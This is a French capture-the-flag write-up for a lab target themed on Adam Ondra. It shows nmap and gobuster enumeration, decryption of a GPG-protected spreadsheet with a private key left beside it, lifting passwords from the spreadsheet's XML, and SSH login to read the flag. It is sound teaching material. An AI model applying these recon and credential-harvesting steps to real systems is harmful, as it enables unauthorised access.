Silence #1
> **Catégorie :** Web / Fuzzing / Crypto (GPG) / Extraction de credentials
> **Cible :** site « Adam Ondra » (Apache), thème escalade
> **Flag :** `EPI{4d4M_0ndr4_Ch4n93_9b+}`
---
Objectif
Un site web cache une archive dans un dossier planqué. Cette archive contient un
fichier Excel chiffré en GPG et la clé privée correspondante. Le but est
de déchiffrer le fichier, d'en extraire une table de mots de passe, puis de se
connecter en SSH pour récupérer le flag utilisateur.
Le fil rouge : un secret protégé par chiffrement ne vaut rien si la clé privée
traîne à côté.
---
1. Reconnaissance réseau (Nmap)
```bash
nmap -sV -sC <IP_CIBLE>
```
Résultat : 2 ports ouverts
Port	Service	Remarque
22	SSH	notre porte de sortie
80	HTTP (Apache)	site « Adam Ondra » (thème escalade)
---
2. Énumération web (Gobuster)
```bash
gobuster dir -u http://<IP_CIBLE>/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html,txt
```
Découvertes :
un dossier `/hidden/` (redirection 301) ;
un indice discret dans le code source de la page d'accueil :
```html
<!-- Silence is golden -->
```
> On lit toujours le HTML brut (`curl` / Ctrl+U) : `Silence is golden` fait écho au
> nom du challenge et confirme qu'on est sur la bonne piste (quelque chose est
> caché « en silence »).
---
3. Fuzzing du dossier caché
Un premier Gobuster sur `/hidden/` avec les extensions courantes (`php,html,txt`)
ne donne rien. Le réflexe : élargir aux extensions d'archives.
```bash
gobuster dir -u http://<IP_CIBLE>/hidden/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x zip,tar,bak,gz,7z
```
> **Leçon :** ne pas se limiter aux extensions web. Les fichiers sensibles fuités
> sont souvent des **backups** (`.bak`) ou des **archives** (`.zip`, `.tar.gz`).
> Élargir la liste d'extensions est un réflexe payant.
→ Découverte de `stats.zip`.
---
4. Extraction de l'archive
```bash
wget http://<IP_CIBLE>/hidden/stats.zip
unzip stats.zip
```
L'archive contient deux fichiers :
`ClimbersStats.xlsx.gpg` → un fichier Excel chiffré en GPG
`.hidden-key` → une clé privée PGP appartenant à `adam@climbing.thm`
C'est l'erreur fatale du challenge : le fichier chiffré et sa clé de
déchiffrement sont livrés ensemble.
---
5. Déchiffrement GPG
On importe la clé privée puis on déchiffre :
```bash
gpg --import .hidden-key
gpg --decrypt ClimbersStats.xlsx.gpg > ClimbersStats.xlsx
```
`gpg --import` → ajoute la clé privée à notre trousseau.
`gpg --decrypt` → déchiffre le fichier. Ici aucune passphrase n'est demandée
(la clé n'est pas protégée), donc le déchiffrement passe directement.
> **Rappel :** GPG est du chiffrement **asymétrique**. Un fichier chiffré pour une
> clé publique ne se déchiffre qu'avec la clé privée associée. Détenir cette clé
> privée = pouvoir tout lire. D'où l'importance de ne jamais la partager.
---
6. Extraction des credentials depuis le .xlsx
Un fichier `.xlsx` est en réalité une archive ZIP contenant du XML. Les
chaînes de texte des cellules sont stockées dans `sharedStrings.xml`.
```bash
unzip ClimbersStats.xlsx -d xlsx_content
cat xlsx_content/xl/sharedStrings.xml
```
> **Astuce :** pas besoin d'ouvrir Excel. On dézippe le `.xlsx` et on lit
> `sharedStrings.xml`, qui contient tout le texte des cellules en clair.
→ Table de credentials révélée :
`adam` / `bibliographieSeemsTough2022`
`magnus` / `youtubeIsClimbingToo`
`janja` / `theClimbingMonster`
---
7. Accès SSH
On teste les identifiants sur le port 22 :
```bash
ssh adam@<IP_CIBLE>     # échoue (mot de passe refusé)
ssh janja@<IP_CIBLE>    # fonctionne
# mot de passe : theClimbingMonster
```
> Tous les comptes trouvés ne sont pas forcément actifs pour SSH. On teste chacun ;
> ici `adam` est refusé mais `janja` passe.
→ accès shell obtenu en tant que `janja`.
---
8. Récupération du flag utilisateur
```bash
cat user.txt
```
→ Flag :
```
EPI{4d4M_0ndr4_Ch4n93_9b+}
```
On passe ensuite à l'escalade de privilèges (voir Silence #2) pour le flag
root.
---
Concepts clés à retenir
Concept	Explication
Fuzzing d'extensions élargi	Toujours tester les extensions d'archives/backups (`zip`, `bak`, `gz`), pas seulement web.
Indice en commentaire HTML	`Silence is golden` oriente vers un contenu caché. Lire le source.
Clé privée + fichier chiffré ensemble	Livrer les deux annule totalement le chiffrement.
GPG asymétrique	Le déchiffrement dépend de la clé privée ; l'importer suffit à tout lire.
`.xlsx` = ZIP	Un fichier Office est une archive ; `sharedStrings.xml` contient le texte des cellules.
Test de tous les comptes	Les creds valides ne donnent pas tous un accès SSH ; essayer chacun.
---
Résumé de la chaîne d'attaque
```
nmap (22/80) → gobuster / → /hidden/ + indice "Silence is golden" →
fuzzing extensions archives → stats.zip →
ClimbersStats.xlsx.gpg + .hidden-key →
gpg --import + --decrypt → .xlsx → sharedStrings.xml (creds) →
ssh janja → user.txt → FLAG
```